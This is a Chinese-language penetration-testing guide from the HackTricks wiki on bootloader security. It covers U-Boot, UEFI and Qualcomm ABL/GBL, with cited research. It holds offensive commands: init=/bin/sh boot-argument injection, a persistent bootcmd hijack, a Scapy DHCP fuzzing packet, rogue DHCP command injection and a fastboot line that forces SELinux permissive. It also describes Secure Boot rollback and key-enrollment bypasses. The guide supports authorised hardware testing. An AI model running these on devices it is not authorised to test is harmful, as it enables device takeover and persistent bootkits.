# Bootloader 测试

{{#include ../../banners/hacktricks-training.md}}

以下步骤适用于修改设备启动配置，以及测试 U-Boot 和 UEFI 类加载器等 bootloader。重点是获取早期代码执行权限、评估签名/回滚保护，并滥用恢复或网络启动路径。

相关内容：通过修补 bl2_ext 绕过 MediaTek secure boot：

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 快速入门与环境滥用

1. 进入解释器 shell
   - 启动期间，在 `bootcmd` 执行前按下已知的中断键（通常是任意键、0、空格，或特定于板子的“魔法”按键序列），即可进入 U-Boot 提示符。<sup>[[1]](#references)</sup>

2. 检查启动状态和变量
   - 常用命令：
     - `printenv`（转储环境变量）
     - `bdinfo`（板卡信息、内存地址）
     - `help bootm; help booti; help bootz`（支持的内核启动方式）
     - `help ext4load; help fatload; help tftpboot`（可用的加载器）

3. 修改启动参数以获取 root shell
   - 添加 `init=/bin/sh`，让内核进入 shell，而不是执行常规 init：
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. 从你的 TFTP 服务器进行网络启动
   - 配置网络并从 LAN 获取 kernel/fit 镜像：
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 通过环境持久化更改
   - 如果 env 存储未启用写保护，你可以持久化控制权：
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - 检查是否存在影响回退路径的变量，如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets`。配置错误的值可能导致反复进入 shell。

6. 检查调试/不安全功能
   - 查找以下情况：`bootdelay` > 0、禁用了 `autoboot`、不受限制地执行 `usb start; fatload usb 0:1 ...`、可通过串口使用 `loady`/`loads`、从不可信介质执行 `env import`，以及加载内核/ramdisk 时未进行签名检查。

7. U-Boot 镜像/验证测试
   - 如果平台声称使用 FIT 镜像实现 secure/verified boot，请尝试使用未签名和被篡改的镜像：
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`，或采用旧版 `verify=n` 行为，通常会允许启动任意 payload。
   - 不要只满足于简单的允许/拒绝结果：近期的 FIT 研究表明，验证路径本身也可能是预认证攻击面。对外部存储的 FIT 数据（`data-offset`、`data-position`、`data-size`）、签名配置选择、`loadables` 以及 overlay / `extra-conf` 处理进行负向测试。
   - 如果你有匹配的源码树，`test/vboot/vboot_test.sh` 是在接触真实硬件前，于 U-Boot sandbox 中复现 FIT 验证行为的快捷方法。<sup>[[10]](#references)</sup>

8. Standard Boot（`bootstd`）、`extlinux` 和脚本启动流程
   - 在较新的 U-Boot 构建中，`bootcmd` 通常只是 Standard Boot 的封装。这意味着，即使可见的环境看起来无害，可写介质、PXE 或 SPI flash 也可能成为真正的信任边界。
   - `extlinux` bootmeth 会在 `/` 和 `/boot` 下搜索 `extlinux/extlinux.conf`；script bootmeth 会先搜索 `boot.scr.uimg`，再搜索 `boot.scr`。在网络启动时，脚本文件名可能来自 `boot_script_dhcp`。
   - 有用的初步检查命令：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - 要测试的滥用场景：攻击者控制的 USB/SD 媒体在 `boot_targets` 中排位靠前、`/boot/extlinux/extlinux.conf` 可写、恶意 TFTP 服务器提供 `boot.scr`，或通过 SPI 支持的脚本执行机制使用 `script_offset_f`。
   - 如果平台依赖 FIT verification，请确保配置在配置级别签名，而不只是对每个镜像单独签名；`required-mode=all` 比接受任意一个必需密钥更严格。

## Network-boot surface (DHCP/PXE) and rogue servers

9. PXE/DHCP 参数模糊测试
   - U-Boot 的旧版 BOOTP/DHCP 处理曾存在内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应泄露内存的情况，这些响应可能将 U-Boot 内存中的字节 leak 到网络上。<sup>[[4]](#references)</sup> 使用过长或边界情况的值（选项 67 bootfile-name、供应商选项、file/servername 字段）测试 DHCP/PXE 代码路径，并观察是否出现挂起或 leak。
   - 用于在网络启动期间压力测试启动参数的最小 Scapy 代码片段：
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - 另外，验证 PXE filename 字段在传递给 shell/loader 逻辑并链接到 OS 侧 provisioning 脚本时，是否未经清理。

10. Rogue DHCP server command injection testing
   - 设置 rogue DHCP/PXE 服务，并尝试在 filename 或 options 字段中注入字符，以触达启动链后续阶段的命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很适用。请先隔离实验室网络。

## SoC ROM recovery modes that override normal boot

许多 SoC 都提供 BootROM“loader”模式，即使 flash 镜像无效，也能通过 USB/UART 接收代码。如果 secure-boot 熔丝尚未烧录，这可以在启动链极早期提供任意代码执行能力。

- NXP i.MX (Serial Download Mode)
  - 工具：`uuu` (mfgtools3) 或 `imx-usb-loader`。
  - 示例：`imx-usb-loader u-boot.imx`，将自定义 U-Boot 推送到 RAM 并运行。
- Allwinner (FEL)
  - 工具：`sunxi-fel`。
  - 示例：`sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip (MaskROM)
  - 工具：`rkdeveloptool`。
  - 示例：`rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`，暂存一个 loader 并上传自定义 U-Boot。

评估设备是否已烧录 secure-boot eFuses/OTP。如果没有，BootROM 下载模式通常可绕过任何更高层的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC-class bootloaders: quick checks

11. ESP tampering, rollback, and key-enrollment testing
   - 挂载 EFI System Partition (ESP)，并检查 loader 组件：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo 路径。
   - 在可能的情况下，从 OS 中导出 Secure Boot 状态和密钥数据库：
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - 如果平台处于 Setup Mode、接受未经身份验证的密钥注册，或出厂时使用测试/默认 Platform Key（PKfail 类），本地管理员或物理攻击者就可以注册自己的 KEK/db，并让 Secure Boot 表面上仍处于“启用”状态，同时启动任意 EFI 二进制文件。<sup>[[3]](#references)</sup>
   - 如果 Secure Boot 撤销列表（dbx）不是最新的，尝试使用降级版本或已知存在漏洞的已签名启动组件启动。如果平台仍信任旧版 shim/bootmanager，通常可以从 ESP 加载自己的内核或 `grub.cfg`，以获得持久化能力。
   - 在 Windows 上，如果固件 `dbx` 中缺少 `Microsoft Windows Production PCA 2011` 签名者，已打补丁的主机仍可能接受存在漏洞的已签名 boot manager；BlackX 中就观察到了这种情况。<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 式绕过可以注册攻击者的 MOK；之后，合法的 shim 可以在后续启动时加载由该密钥签名的 EFI payload。<sup>[[12]](#references)[[13]](#references)</sup> 之后撤销旧的 Windows 签名者并不会移除已注册的 MOK，因此只要该 shim 仍受信任，基于 shim 的路径就可能持续存在。<sup>[[12]](#references)</sup>
   - 在授权的 UEFI 机器上测试此回滚路径之前，请检查**固件实际生效的撤销状态**，而不只是查看 Windows 更新历史记录。<sup>[[13]](#references)[[14]](#references)</sup> Microsoft 提供了以下只读的提权 PowerShell 检查命令，用于检查 `dbx` 中的 2011 签名者：<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` 只是一个线索：在可恢复的实验环境中确认具体被签名的启动组件及其他撤销项。<sup>[[12]](#references)[[14]](#references)</sup> 待处理的注册表更新或已过期的签名证书，并不等同于已完成的 `dbx` 撤销。<sup>[[13]](#references)[[14]](#references)</sup>

12. 过时 shim / SBAT / dbx 撤销测试
   - 如果撤销信息过时，旧版 Microsoft 签名 shim 和厂商分支仍可能成为类似 BYOVD 的 bootkit 攻击路径。在隔离的实验环境中，将一个历史上存在漏洞的 shim 放到 ESP 上，并尝试链式加载自己的 `grubx64.efi` 或内核。<sup>[[11]](#references)</sup>
   - 快速分诊：
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - 如果 shim 尽管位于撤销列表中仍能运行，说明固件/OS 的 `dbx` 更新已过时，或者信任一个未继承上游 SBAT 保护的分叉 loader。

13. Boot logo parsing bugs (LogoFAIL 类)
   - 多家 OEM/IBV 固件存在 DXE 中的图像解析漏洞，会处理启动 logo。如果攻击者能将特制图像放入 ESP 中的厂商专用路径（例如 `\EFI\<vendor>\logo\*.bmp`），并重启设备，那么即使启用了 Secure Boot，也可能在启动早期实现 code execution。测试平台是否接受用户提供的 logo，以及这些路径是否可从 OS 写入。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) 信任缺口

对于使用 Qualcomm 的 ABL 加载 **Generic Bootloader Library (GBL)** 的 Android 16 设备，需验证 ABL 是否会对从 `efisp` 分区加载的 UEFI app 进行 **认证**。如果 ABL 只检查 UEFI app 是否 **存在**，而不验证签名，那么对 `efisp` 的写入原语就能在启动时实现 **pre-OS unsigned code execution**。<sup>[[6]](#references)[[7]](#references)</sup>

实用检查和滥用途径：

- **efisp 写入原语**：需要有方法将自定义 UEFI app 写入 `efisp`（root/特权服务、OEM app 漏洞、recovery/fastboot 路径）。如果没有这种方法，就无法直接利用 GBL 加载缺口。<sup>[[6]](#references)</sup>
- **fastboot OEM 参数注入**（ABL 漏洞）：某些构建版本会接受 `fastboot oem set-gpu-preemption` 中的额外参数，并将其附加到 kernel cmdline。可利用此方式强制启用宽松的 SELinux，从而写入受保护分区：
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  如果设备已打补丁，该命令应拒绝额外参数。<sup>[[5]](#references)[[6]](#references)</sup>
- **通过持久化标志解锁 bootloader**：boot 阶段的 payload 可以翻转持久化解锁标志（例如 `is_unlocked=1`、`is_unlocked_critical=1`），从而绕过 OEM 服务器/审批门槛，模拟 `fastboot oem unlock`。下次重启后，这种状态更改仍会保留。<sup>[[6]](#references)</sup>

防御/分诊注意事项：

- 确认 ABL 是否会对来自 `efisp` 的 GBL/UEFI payload 执行签名验证。如果没有，应将 `efisp` 视为高风险持久化攻击面。
- 检查 ABL fastboot OEM 处理程序是否已打补丁，以**验证参数数量**并拒绝额外的 token。<sup>[[8]](#references)[[9]](#references)</sup>

## 硬件注意事项

在早期启动阶段与 SPI/NAND 闪存交互时（例如通过接地引脚绕过读取），务必谨慎，并始终查阅闪存数据手册。短接时机不当可能损坏设备或编程器。

## 备注和其他提示

- 尝试使用 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 和存储设备之间移动环境数据块；某些平台允许在没有身份验证的情况下从可移动介质导入环境变量。
- 对于通过 `extlinux.conf` 启动的基于 Linux 的系统，如果没有强制执行签名检查，通常只需修改启动分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）即可实现持久化。
- 如果目标设备使用双槽/A/B 更新，请查看 [固件分析概述](README.md) 中的 anti-rollback 和 slot-desync 技术，以免忽略 bootloader 本身以外仅存在于 updater 中的信任缺口。
- 如果用户空间提供 `fw_printenv/fw_setenv`，请验证 `/etc/fw_env.config` 是否与实际环境变量存储区相符。偏移量配置错误可能导致你读写错误的 MTD 区域。

## References

- [1] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [发现 LogoFAIL：系统启动期间图像解析的危险](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail：不可信的平台密钥削弱 UEFI 生态系统中的 Secure Boot](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 详情](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [抢先一步：通过两个未经净化的字符串解锁 Xiaomi](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL 漏洞允许攻击者解锁 bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) 架构](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg：修复不可信输入传播到 kernel cmdline 的问题](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg：为 set-hw-fence-value 命令添加检查](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [无法启动：破坏 U-Boot 的 FIT 签名验证](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [漏洞说明 VU#616257 - Microsoft 签名的 UEFI shim bootloader 易受 Secure Boot 绕过攻击](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit：传言属实](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX：类似 BlackLotus 的 UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [如何管理 Secure Boot 变更对应的 Windows Boot Manager 吊销项](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
